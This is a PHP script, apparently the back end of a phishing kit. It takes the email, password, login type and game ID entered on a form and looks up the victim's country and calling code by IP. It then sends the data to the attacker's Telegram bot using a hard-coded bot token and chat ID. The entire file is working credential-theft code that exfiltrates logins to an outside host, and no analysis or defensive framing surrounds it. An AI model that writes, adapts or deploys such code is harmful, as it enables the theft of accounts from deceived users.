<?php
$ip = $_SERVER['REMOTE_ADDR'];


    function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

 $ip = getUserIP();
 $ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");

$country = file_get_contents("https://ipapi.co/".$ip."/country_name");
$API_KEY = "5149596479:AAGOTnxh_AC8FlTnJxndIaX8gunGt-56oUs";//YOUTOKEN
$admin = 814024153 ; //YOURID
$user = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$time = date("Y-m-d H:i:s");
$text = urlencode("
ʜɪ ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ
━━━━━━━━━━━━
ᯓ ᴛʏᴘᴇ » $login
ᯓ ᴇᴍᴀɪʟ » `$user`
ᯓ ᴘᴀssᴡᴏʀᴅ » `$password`
ᯓ ᴄᴏᴅᴇ  » `+$ccode`
ᯓ ᴄᴏᴜɴᴛʀʏ » $country
ᯓ ᴅᴀᴛᴇ » $time
━━━━━━━━━━━━
˹ 𝙳𝙴𝚅 𝙱𝚈 @IndexSuper ˼
");

$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>